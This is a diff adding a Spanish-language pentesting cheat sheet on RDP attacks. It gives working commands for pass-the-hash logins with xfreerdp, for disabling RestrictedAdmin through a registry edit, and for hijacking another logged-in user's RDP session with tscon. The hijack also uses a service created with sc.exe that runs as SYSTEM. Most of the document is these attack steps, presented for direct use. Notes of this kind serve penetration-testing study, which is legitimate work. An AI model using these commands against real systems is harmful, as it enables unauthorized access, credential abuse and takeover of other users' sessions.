@@ -1,0 +1,26 @@
+####RDP
+RDP (puerto 3389) sirve para conectarse de forma remota a una maquina.
+
+##CONEXION
+xfreerdp /v:ip'/u:user /p:'psw'
+#Comando para conectarse con usr y psw
+
+##PASS THE HASH ATTACK
+Sirve para conectarse con el hash de SAM del usuario. En el caso de que no te permita hacerlo se puede usar:
+reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+#Se ejecuta en el cmd windows para poder habilitar el DisableRstrictedAdmin en regedit y usar pass the hash
+xfreerdp /v:ip'/u:user /pth:'hash'
+#Comando para conectarse con el hash de la cuenta
+
+##SUPLANTAR USARIO CONECTADO
+Si tenemos sesion en RDP y tenemos privilegios SYSTEM podemos intentar suplantar la cuenta (sin passwd) de otro usuario conectado por rdp a nuestra maquina
+query user
+#Correrlo en ps o cmd sirve para ver los usuarios que hay conectados en el momento
+tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
+#Con la info de la query podemos correr el comando de arriba en cmd para obtener su sesion en nuestra consola
+
+sc.exe create sessionhijack binpath= "cmd.exe /k tscon 1 /dest:rdp-tcp#0"
+#Con este comando en cmd o ps, podemos ibtener privilegios SYSTEM en el caso de contar con privilegios de administrador local
+#Sirve para crear un servicio que se ejecuta como SYSTEM donde el comando (binpath) es la suplantacion de la identidad
+net start sessionhijack
+#En el ejemplo, el servicio se llama "sessionhijack". Con el comando anterior lo ejecutamos.
